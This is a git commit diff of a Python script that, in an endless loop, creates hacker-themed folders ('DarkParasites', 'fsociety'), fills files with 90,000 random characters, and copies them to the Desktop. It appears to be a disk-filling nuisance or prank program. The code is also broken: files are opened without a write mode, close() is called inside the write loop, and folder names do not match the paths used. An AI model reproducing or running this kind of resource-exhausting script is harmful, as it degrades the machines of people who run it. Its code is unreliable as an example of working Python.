5162ad63eee3ce4774028ae0dc3db53352d4ca08
Delwser <87214159+Delwser@users.noreply.github.com>
2024-04-08 12:06:47 -0300

    Update g3ntl3m4n.py

--- g3ntl3m4n.py
+++ g3ntl3m4n.py
@@ -4,28 +4,31 @@ import shutil
 import string
 
 while True:
-    os.makedirs("DarkParasites" , exist_ok=True)
+    os.makedirs("DarkParasites" "a" , exist_ok=True)
     with open(f"DarkParisites/bypass.txt") as arquivo:
          for _ in range(90000):
               arquivo.write(random.choice(string.ascii_letters + string.digits))
+              arquivo.close()
 
-    origem = "bypass.txt"
+    origem = "DarkParisites/bypass.txt"
     destino = 'Desktop/'
     shutil.copy(origem, destino)
 
     os.makedirs("Th3_g3ntl3m4n" , exist_ok=True)
-    with open(f"Th3_g3ntl3m4n/t@nd3r@") as arquivo:
+    with open(f"Th3_g3ntl3m4n/t@nd3r@.txt") as arquivo:
          for _ in range(90000):
               arquivo.write(random.choice(string.ascii_letters + string.digits))
+              arquivo.close()
 
-    origem_two = "t@nd3r@"
+    origem_two = "Th3_g3ntl3m4n/t@nd3r@.txt"
     shutil.copy(origem_two, destino)
 
     os.makedirs("J0aninh@s" , exist_ok=True)
-    with open(f"J0aninh@s/fsociety") as arquivo:
+    with open(f"J0aninh@s/fsociety.txt") as arquivo:
          for _ in range(90000):
               arquivo.write(random.choice(string.ascii_letters + string.digits))
-    origem_three = "fsociety"
+              arquivo.close()
+    origem_three = "J0aninh@s/fsociety.txt"
     shutil.copy(origem_three, destino)
 
 
